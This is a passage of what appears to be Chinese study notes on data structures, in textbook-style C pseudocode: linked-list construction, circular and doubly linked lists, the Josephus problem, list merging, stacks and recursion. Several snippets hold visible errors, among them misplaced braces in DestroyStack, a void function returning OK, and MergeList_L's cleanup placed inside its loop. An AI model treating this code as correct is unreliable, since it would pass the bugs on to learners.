title="5.6单链表的建立（尾插法）"></a>5.6单链表的建立（尾插法）</h3><blockquote><p>【算法步骤】</p></blockquote><ul><li>从一个空表L开始，将新结点逐个插入到链表的尾部，尾指针r指向链表的尾结点。</li><li>初始时，r同L均指向头结点。每读入一个数据元素则申请一个新结点，将新结点插入到尾结点后，r指向新结点</li></ul><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_L</span><span class="params">(LinkList &amp;L,<span class="type">int</span> n)</span>&#123; </span><br><span class="line"><span class="comment">//正位序输入n个元素的值，建立带表头结点的单链表L </span></span><br><span class="line">L=new LNode; </span><br><span class="line">L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//先建立一个带头结点的单链表</span></span><br><span class="line">r=L; <span class="comment">//尾指针r指向头结点</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;++i)&#123; </span><br><span class="line">p=new LNode; <span class="comment">//生成新结点</span></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;p-&gt;data; <span class="comment">//输入元素值</span></span><br><span class="line">p-&gt;next=<span class="literal">NULL</span>; r-&gt;next=p; <span class="comment">//插入到表尾</span></span><br><span class="line">r=p; <span class="comment">//r指向新的尾结点</span></span><br><span class="line">&#125; </span><br><span class="line">&#125;<span class="comment">//CreateList_L</span></span><br></pre></td></tr></table></figure><h3 id="5-7循环链表"><a href="#5-7循环链表" class="headerlink" title="5.7循环链表"></a>5.7循环链表</h3><p>循环链表：表中最后一个节点的指针域指向头结点，整个链表形成一个环。</p><p><img src="/img/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8.png" alt="循环链表"></p><p>从循环链表中的任何一个结点的位置都可以找到其他所有结点，而单链表做不到；</p><p><img src="/img/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8%E9%81%BF%E5%85%8D%E6%AD%BB%E5%BE%AA%E7%8E%AF.png" alt="循环链表避免死循环"></p><p>对循环链表，有时不给出头指针，而给出尾指针<br>可以更方便的找到第一个和最后一个结点</p><blockquote><p>如何查找开始结点和终端结点？</p></blockquote><pre><code>开始结点：rear-&gt;next-&gt;next终端结点：rear</code></pre><p>循环链表的合并（Ta表尾连接Tb表头，Tb表尾连接Ta表头，去除Tb的表头）</p><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LinkList <span class="title function_">Connect</span><span class="params">(LinkList Ta, LinkList Tb)</span></span><br><span class="line">&#123;<span class="comment">//假设Ta、Tb都是非空的单循环链表</span></span><br><span class="line">p=Ta-&gt;next;<span class="comment">//①p存表头结点</span></span><br><span class="line">Ta-&gt;next=Tb-&gt;next-&gt;next;<span class="comment">//②Tb表头(Tb-&gt;next-&gt;next，即Tb第一个元素节点)连结Ta表尾(Ta-&gt;next)，注意不包括Tb的头结点！</span></span><br><span class="line">deleteTb-&gt;next;<span class="comment">//③释放Tb表头结点</span></span><br><span class="line">Tb-&gt;next=p;<span class="comment">//④Tb的表尾连接到Ta的头结点</span></span><br><span class="line"><span class="keyword">return</span> Tb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>约瑟夫问题</p></blockquote><p>在罗马人占领乔塔帕特后39 个犹太人与约瑟夫及他的朋友躲到一个洞中39个犹太人决定宁愿死也不要被敌人抓到，于是决定了一个自杀方式：</p><p>41个人排成一个圆圈，由第1个人开始报数，每报数到第3人该人就必须自杀，然后再由下一个重新报数，直到所有人都自杀身亡为止。<br>然而约瑟夫和他的朋友并不想遵从，要他的朋友先假装遵从，他将朋友与自己安排在第16个与第31个位置，于是逃过了这场死亡游戏</p><p>约瑟夫问题的解法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Josephus</span> <span class="params">( <span class="type">int</span> n, <span class="type">int</span> m )</span> &#123;</span><br><span class="line">Firster ( ); <span class="comment">//检验指针指向第一个结点</span></span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++ ) &#123; <span class="comment">//执行n-1次</span></span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> j = <span class="number">0</span>; j &lt; m<span class="number">-1</span>; j++ ) Next ( );</span><br><span class="line"><span class="comment">//循环m次使current指向被删除结点</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; “出列的人是” &lt;&lt; GetElem_L ( ) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//出列人员的数据</span></span><br><span class="line">ListDelete ( ); <span class="comment">//删去每一趟的第m结点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-8双向链表"><a href="#5-8双向链表" class="headerlink" title="5.8双向链表"></a>5.8双向链表</h3><p>单链表只能先后寻查其他节点，如要寻查节点的直接前驱则只能从表头指针出发，而双向链表可解决这个问题。</p><p><img src="/img/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A81.png" alt="双向链表1"></p><p><img src="/img/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A82.png" alt="双向链表2"></p><h3 id="5-9双向链表的删除"><a href="#5-9双向链表的删除" class="headerlink" title="5.9双向链表的删除"></a>5.9双向链表的删除</h3><p>对比单链表为什么用两个指针？</p><ol><li>节点a的后继指针域指向节点c<br> p-&gt;prior-&gt;next&#x3D;p-&gt;next;</li></ol><p><img src="/img/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8%E7%9A%84%E5%88%A0%E9%99%A41.png" alt="双向链表的删除1"></p><ol start="2"><li>节点c的前驱指针域指向节点a<br>p-&gt;next-&gt;prior&#x3D;p-&gt;prior;</li></ol><p><img src="/img/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8%E7%9A%84%E5%88%A0%E9%99%A42.png" alt="双向链表的删除2"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">ListDelete_DuL</span><span class="params">(DuLinkList &amp;L,<span class="type">int</span> i,ElemType &amp;e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!(p=GetElemP_DuL(L,i))) <span class="keyword">return</span> ERROR; <span class="comment">//在L中确定第i</span></span><br><span class="line">个位置元素的位置指针p，p为空时元素不存在</span><br><span class="line">e=p-&gt;data; <span class="comment">//保存被删除节点的值</span></span><br><span class="line">p-&gt;prior-&gt;next=p-&gt;next; <span class="comment">//节点a的后继指针域指向节点c p-&gt;next-&gt;prior=p-&gt;prior; //节点c的前驱指针域指向节点a</span></span><br><span class="line">delete p; <span class="comment">//释放被删除节点空间</span></span><br><span class="line"><span class="keyword">return</span> OK; &#125;</span><br></pre></td></tr></table></figure><h2 id="6顺序表和链表的比较"><a href="#6顺序表和链表的比较" class="headerlink" title="6顺序表和链表的比较"></a>6顺序表和链表的比较</h2><p><img src="/img/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="顺序表和链表的比较"></p><h2 id="7线性表的应用"><a href="#7线性表的应用" class="headerlink" title="7线性表的应用"></a>7线性表的应用</h2><h3 id="7-1线性表的合并"><a href="#7-1线性表的合并" class="headerlink" title="7.1线性表的合并"></a>7.1线性表的合并</h3><p>问题描述：<br>假设利用两个线性表La和Lb分别表示两个集合<br>A和B,现要求一个新的集合<br>    A&#x3D;A B</p><pre><code>    La=(7, 5, 3, 11)    Lb=(2, 6, 3)    La=(7, 5, 3, 11, 2, 6)</code></pre><blockquote><p>【算法步骤】</p></blockquote><p>依次取出Lb 中的每个元素，执行以下操作：</p><ul><li>1.在La中查找该元素</li><li>2.如果找不到，则将其插入La的最后</li></ul><p>既可以用顺序表实现，也可以用链表实现</p><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">union</span><span class="params">(List &amp;La, List Lb)</span>&#123;</span><br><span class="line">La_len=ListLength(La);</span><br><span class="line">Lb_len=ListLength(Lb);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=Lb_len;i++)&#123;</span><br><span class="line">GetElem(Lb, i, e);</span><br><span class="line"><span class="keyword">if</span>(!LocateElem(La,e)) <span class="comment">//La中不存在和e相同的元素</span></span><br><span class="line">ListInsert(&amp;La,++La_len,e); <span class="comment">//将e插在La的最后并长度加1 </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-2有序表的合并"><a href="#7-2有序表的合并" class="headerlink" title="7.2有序表的合并"></a>7.2有序表的合并</h3><p>已知线性表La 和Lb中的数据元素按值非递减有序排列，现要求将La和Lb归并为一个新的线性表Lc,且Lc中的数据元素仍按值非递减有序排列。</p><blockquote><p>【算法步骤】－有序的顺序表合并</p></blockquote><ul><li>创建一个空表Lc，长度为La和Lb的长度之和</li><li>依次从 La 或 Lb中“摘取”元素值较小的结点插入到 Lc 表的最后，直至其中一个表变空为止</li><li>继续将 La 或 Lb其中一个表的剩余结点插入在 Lc表的最后</li></ul><blockquote><p>【算法描述】－有序的顺序表合并</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MergeList_Sq</span><span class="params">(SqList LA,SqList LB,SqList &amp;LC)</span>&#123; </span><br><span class="line">pa=LA.elem; pb=LB.elem; <span class="comment">//指针pa和pb的初值分别指向两个表的第一个元素</span></span><br><span class="line">LC.length=LA.length+LB.length; <span class="comment">//新表长度为待合并两表的长度之和</span></span><br><span class="line">LC.elem=new ElemType[LC.length]; <span class="comment">//为合并后的新表分配一个数组空间</span></span><br><span class="line">pc=LC.elem; <span class="comment">//指针pc指向新表的第一个元素</span></span><br><span class="line">pa_last=LA.elem+LA.length<span class="number">-1</span>; <span class="comment">//指针pa_last指向LA表的最后一个元素</span></span><br><span class="line">pb_last=LB.elem+LB.length<span class="number">-1</span>; <span class="comment">//指针pb_last指向LB表的最后一个元素</span></span><br><span class="line"><span class="keyword">while</span>(pa&lt;=pa_last &amp;&amp; pb&lt;=pb_last)&#123; <span class="comment">//两个表都非空</span></span><br><span class="line"><span class="keyword">if</span>(*pa&lt;=*pb) *pc++=*pa++; <span class="comment">//依次“摘取”两表中值较小的结点</span></span><br><span class="line"><span class="keyword">else</span> *pc++=*pb++; &#125;; </span><br><span class="line"><span class="keyword">while</span>(pa&lt;=pa_last) *pc++=*pa++ <span class="comment">//LB已到达表尾，依次将LA剩余元素插入LC</span></span><br><span class="line"><span class="keyword">while</span>(pb&lt;=pb_last) *pc++=*pb++; <span class="comment">//LA已到达表尾，依次将LB剩余元素插入LC</span></span><br><span class="line">&#125;<span class="comment">//MergeList_Sq</span></span><br></pre></td></tr></table></figure><blockquote><p>【算法步骤】－有序的链表合并</p></blockquote><ul><li>Lc指向La</li><li>依次从 La 或 Lb 中“摘取”元素值较小的结点插入到 Lc 表的最后，直至其中一个表变空为止。</li><li>继续将 La 或 Lb 其中一个表的剩余结点插入在Lc 表的最后。</li><li>释放 Lb 表的表头结点</li></ul><blockquote><p>【算法描述】－有序的链表合并</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MergeList_L</span><span class="params">(LinkList &amp;La,LinkList &amp;Lb,LinkList &amp;Lc)</span>&#123;</span><br><span class="line">pa=La-&gt;next; pb=Lb-&gt;next;</span><br><span class="line">pc=Lc=La; <span class="comment">//用La的头结点作为Lc的头结点</span></span><br><span class="line"><span class="keyword">while</span>(pa &amp;&amp; pb)&#123;</span><br><span class="line"><span class="keyword">if</span>(pa-&gt;data&lt;=pb-&gt;data)&#123; pc-&gt;next=pa;pc=pa;pa=pa-&gt;next;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;pc-&gt;next=pb; pc=pb; pb=pb-&gt;next;&#125;</span><br><span class="line">pc-&gt;next=pa?pa:pb; <span class="comment">//插入剩余段</span></span><br><span class="line">delete Lb;&#125; <span class="comment">//释放Lb的头结点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8总结"><a href="#8总结" class="headerlink" title="8总结"></a>8总结</h2><p><img src="/img/%E5%B0%8F%E7%BB%93.png" alt="小结"></p><h1 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h1><h2 id="1-栈和队列的定义和特点"><a href="#1-栈和队列的定义和特点" class="headerlink" title="1 栈和队列的定义和特点"></a>1 栈和队列的定义和特点</h2><blockquote><p>栈</p></blockquote><pre><code>01 定 义： 只能在表的一端（栈顶）进行插入和删除运算的线性表（受限）02 逻辑结构：与线性表相同，仍为一对一关系03 存储结构：用顺序栈或链栈存储均可，但以顺序栈更常见       04 运算规则：只能在栈顶运算，且访问结点时依照后进先出（LIFO）或先进后出（FILO）的原则05 实现方式：关键是编写入栈和出栈函数，具体实现依顺序栈或链栈的不同而不同基本操作有入栈、出栈、读栈顶元素值、建栈、判断栈满、栈空等</code></pre><blockquote><p>队列</p></blockquote><pre><code>01 定 义： 只能在表的一端（队尾）进行插入，在另一端（队头）进行删除运算的线性表02 逻辑结构：与线性表相同，仍为一对一关系03 存储结构：用顺序队列或链队存储均可04 运算规则：先进先出（FIFO）05 实现方式：关键是编写入队和出队函数，具体实现依顺序队或链队的不同而不同</code></pre><p><img src="/img/%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97%E5%92%8C%E4%B8%80%E8%88%AC%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="栈与队列和一般线性表的区别"></p><h2 id="2-案例引入"><a href="#2-案例引入" class="headerlink" title="2 案例引入"></a>2 案例引入</h2><p>案例3.1 ：一元多项式的运算</p><p>案例3.2：号匹配的检验</p><p>案例3.3 ：表达式求值</p><p>案例3.4 ：舞伴问题</p><h2 id="3-栈的表示和操作的实现"><a href="#3-栈的表示和操作的实现" class="headerlink" title="3 栈的表示和操作的实现"></a>3 栈的表示和操作的实现</h2><p><img src="/img/%E6%A0%88%E7%9A%84%E8%A1%A8%E7%A4%BA.jpg" alt="栈的表示"></p><blockquote><p>顺序栈的表示</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">SElemType *base; <span class="comment">//栈底指针</span></span><br><span class="line">SElemType *top; <span class="comment">//栈顶指针</span></span><br><span class="line"><span class="type">int</span> stacksize; <span class="comment">//栈可用的最大容量</span></span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure><blockquote><p>顺序栈初始化</p></blockquote><p>步骤：</p><p>(1)分配空间并检查空间是否分配失败，若失败则返回错误</p><p>(2)设置栈底和栈顶指针S.top &#x3D; S.base;</p><p>(3)设置栈大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">InitStack</span><span class="params">( SqStack &amp;S )</span></span><br><span class="line">&#123;</span><br><span class="line">S.base =new SElemType[MAXSIZE]；<span class="comment">//动态分配数组</span></span><br><span class="line">空间给顺序栈</span><br><span class="line"><span class="keyword">if</span>( !S.base ) <span class="keyword">return</span> OVERFLOW; <span class="comment">//存储分配失败</span></span><br><span class="line">S.top = S.base; <span class="comment">//top初始为base，空栈</span></span><br><span class="line">S.stackSize = MAXSIZE; <span class="comment">//栈最大容量为MAXSIZE</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>求顺序栈的长度</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始为0，添加n个元素为n</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">StackLength</span><span class="params">( SqStack S )</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> S.top – S.base; &#125;</span><br></pre></td></tr></table></figure><blockquote><p>清空顺序栈</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意判断S.base是否为空</span></span><br><span class="line">Status <span class="title function_">ClearStack</span><span class="params">( SqStack S )</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( S.base ) <span class="comment">//不为空</span></span><br><span class="line">S.top = S.base;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>销毁顺序栈</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">DestroyStack</span><span class="params">( SqStack &amp;S )</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( S.base ) <span class="comment">//不为空</span></span><br><span class="line">&#123;</span><br><span class="line">delete S.base; <span class="comment">//base所指的内存被释放，但 是base所指的地址仍然不变</span></span><br><span class="line">S.stacksize = <span class="number">0</span>; </span><br><span class="line">S.base = S.top = <span class="literal">NULL</span>; <span class="comment">//必须要置空 &#125;</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>顺序栈入栈</p></blockquote><p>(1)判断是否栈满，若满则出错</p><p>(2)元素e压入栈顶</p><p>(3)栈顶指针加1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">Push</span><span class="params">( SqStack &amp;S, SElemType e)</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( S.top - S.base== S.stacksize ) <span class="comment">// 是否栈满</span></span><br><span class="line"><span class="keyword">return</span> ERROR; </span><br><span class="line">*S.top++=e; <span class="comment">//元素e压入栈顶，栈顶指针加1（注意顺序！）</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>顺序栈出栈</p></blockquote><p>(1)判断是否栈空，若空则出错</p><p>(2)获取栈顶元素e</p><p>(3)栈顶指针减1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">Pop</span><span class="params">( SqStack &amp;S, SElemType &amp;e)</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( S.top == S.base ) <span class="comment">// 栈空</span></span><br><span class="line"><span class="keyword">return</span> ERROR; </span><br><span class="line">e＝ *--S.top; <span class="comment">//栈顶指针减1，栈顶元素赋值给e（注意顺序！）</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>取顺序栈栈顶元素</p></blockquote><p>(1)判断是否空栈，若空则返回错误</p><p>(2)否则通过栈顶指针获取栈顶元素</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">GetTop</span><span class="params">( SqStack S, SElemType &amp;e)</span> <span class="comment">//此处是S而不是&amp;S</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( S.top == S.base ) <span class="keyword">return</span> ERROR; <span class="comment">// 栈空</span></span><br><span class="line">e = *( S.top – <span class="number">1</span> ); </span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>链栈的表示</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span> &#123;</span></span><br><span class="line">    SElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; StackNode, *LinkStack;</span><br><span class="line">LinkStack S;</span><br></pre></td></tr></table></figure><blockquote><p>链栈的初始化</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(LinkStack &amp;S )</span></span><br><span class="line">&#123;</span><br><span class="line">S=<span class="literal">NULL</span>; <span class="comment">//构建一个空栈，栈顶指针置空</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>判断链栈是否为空</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">StackEmpty</span><span class="params">(LinkStack S)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (S==<span class="literal">NULL</span>) <span class="keyword">return</span> TRUE;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> FALSE; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>链栈进栈</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">Push</span><span class="params">(LinkStack &amp;S , SElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line">p=new StackNode; <span class="comment">//生成新结点p </span></span><br><span class="line"><span class="keyword">if</span> (!p) <span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">p-&gt;data=e; <span class="comment">//新节点数据域置为e </span></span><br><span class="line">p-&gt;next=S; <span class="comment">//将新节点插入栈顶</span></span><br><span class="line">S=p; <span class="comment">//让指针S指向栈顶</span></span><br><span class="line"><span class="keyword">return</span> OK; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>链栈进栈</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">Pop</span> <span class="params">(LinkStack &amp;S,SElemType &amp;e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (S==<span class="literal">NULL</span>) <span class="keyword">return</span> ERROR; <span class="comment">//栈空返回错误</span></span><br><span class="line">e = S-&gt; data; <span class="comment">//将栈顶元素赋值给e</span></span><br><span class="line">p = S; <span class="comment">//用p临时保存栈顶元素空间，以便释放</span></span><br><span class="line">S = S-&gt; next; <span class="comment">//修改栈顶指针，指向下个元素</span></span><br><span class="line">delete p; <span class="comment">//释放原栈顶元素空间</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>取链栈栈顶元素</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SElemType <span class="title function_">GetTop</span><span class="params">(LinkStack S)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (S==<span class="literal">NULL</span>) <span class="built_in">exit</span>(<span class="number">1</span>)；<span class="comment">//栈非空</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> S–&gt;data; <span class="comment">//返回栈顶元素的</span></span><br><span class="line">值，栈顶指针不变</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-栈与递归"><a href="#4-栈与递归" class="headerlink" title="4 栈与递归"></a>4 栈与递归</h2><p>以下三种情况常常用到递归方法：</p><ul><li>递归定义的数学函数</li><li>可递归求解的问题</li><li>具有递归特性的数据结构</li></ul><ol><li><p>递归定义的数学函数:<br><img src="/img/%E9%80%92%E5%BD%92%E5%AE%9A%E4%B9%89%E7%9A%84%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0.png" alt="递归定义的数学函数"></p></li><li><p>具有递归特性的数据结构:<br>•树:Root, Lchild, Rchild<br>• 广义表 A&#x3D;(a, A)</p></li><li><p>可递归求解的问题:<br>迷宫问题、汉诺塔（ Hanoi, 又称河内塔）问题、八皇后问题</p></li></ol><h3 id="4-1用分治法求解递归问题"><a href="#4-1用分治法求解递归问题" class="headerlink" title="4.1用分治法求解递归问题"></a>4.1用分治法求解递归问题</h3><p>分治法：对于一个较为复杂的问题，能够分解成几个相对简单的且解法相同或类似的子问题来求解</p><p>必备的三个条件:</p><ul><li>能将一个问题转变成一个新问题，而新问题与原问题的解法相同或类同，不同的仅是处理的对象，且这些处理对象是变化有规律的</li><li>可以通过上述转化而使问题简化</li><li>必须有一个明确的递归出口，或称递归的边界<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">分治法求解递归问题算法的一般形式：</span><br><span class="line"><span class="type">void</span> <span class="title function_">X</span><span class="params">(参数表)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> （递归结束条件）可直接求解步骤；-----基本项</span><br><span class="line"><span class="keyword">else</span> X（较小的参数）；------归纳项</span><br><span class="line">&#125; </span><br><span class="line"><span class="type">long</span> Fact ( <span class="type">long</span> n ) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">//基本项</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> n * Fact (n<span class="number">-1</span>); <span class="comment">//归纳项</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/img/n%E7%9A%84%E9%98%B6%E4%B9%98%E6%B1%82%E8%A7%A3.png" alt="n的阶乘求解"></li></ul><blockquote><p>任意函数之间调用过程</p></blockquote><p>调用前, 系统完成:</p><p>(1) 将实参, 返回地址等传递给被调用函数</p><p>(2) 为被调用函数的局部变量分配存储区</p><p>(3) 将控制转移到被调用函数的入口</p><p>调用后, 